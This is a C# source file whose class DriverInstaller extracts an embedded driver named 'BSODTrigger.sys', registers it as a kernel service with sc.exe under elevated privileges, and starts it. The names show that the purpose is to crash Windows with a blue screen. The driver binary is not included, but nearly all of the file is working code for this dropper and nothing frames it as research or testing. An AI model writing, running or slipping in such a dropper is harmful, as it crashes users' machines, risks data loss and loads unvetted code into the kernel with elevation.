using Kairo.Properties;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace Kairo.Utils
{
    internal class DriverInstaller
    {
        private const string DriverResourceName = "BSODTrigger.sys"; // Adjust the namespace and filename
        private const string DriverFileName = "BSODTrigger.sys";
        private static readonly string driverPath = Path.Combine(AppContext.BaseDirectory, DriverFileName);
        public static void Installer()
        {
            
            Cleanup(driverPath);
            // Extract the driver file
            ExtractDriver(driverPath);

            // Install and start the driver
            InstallDriver(driverPath);
        }

        private static void ExtractDriver(string driverPath)
        {
            if (!File.Exists(driverPath))
            {
                using (FileStream fileStream = new("BSODTrigger.sys", FileMode.Create))
                {
                    fileStream.Write(Resources.BSODTrigger, 0, Resources.BSODTrigger.Length);
                }
            }
            
        }

        private static void InstallDriver(string driverPath)
        {
            // Install the driver
            Process? create = Process.Start(new ProcessStartInfo
            {
                FileName = "sc.exe",
                Arguments = $"create BSODDriver binPath= \"{driverPath}\" type= kernel",
                Verb = "runas", // Ensure it runs with elevated privileges
                UseShellExecute = false,
                RedirectStandardOutput = true
            });
            create.BeginOutputReadLine();
            create.OutputDataReceived += SortOutputHandler;
            create.WaitForExit();
            
            // Start the driver
            Process? start = Process.Start(new ProcessStartInfo
            {
                FileName = "sc.exe",
                Arguments = "start BSODDriver",
                Verb = "runas", // Ensure it runs with elevated privileges
                UseShellExecute = false,
                RedirectStandardOutput = true
                
            });
            start.BeginOutputReadLine();
            start.OutputDataReceived += SortOutputHandler;
            start.WaitForExit();
        }
        public static void Cleanup() {
            Cleanup(driverPath);
        }
        private static void Cleanup(string driverPath)
        {
            try
            {
                if (File.Exists(driverPath))
                {
                    File.Delete(driverPath);
                }
            }
            catch (Exception ex) { 
            
            }
            

            Process.Start(new ProcessStartInfo
            {
                FileName = "sc.exe",
                Arguments = "delete BSODDriver",
                Verb = "runas", // Ensure it runs with elevated privileges
                UseShellExecute = true
            })?.WaitForExit();
        }
        private static void SortOutputHandler(object sender, DataReceivedEventArgs e)
        {
            if (!string.IsNullOrEmpty(e.Data))
            {
                Console.WriteLine(e.Data);
            }
        }
    }
}
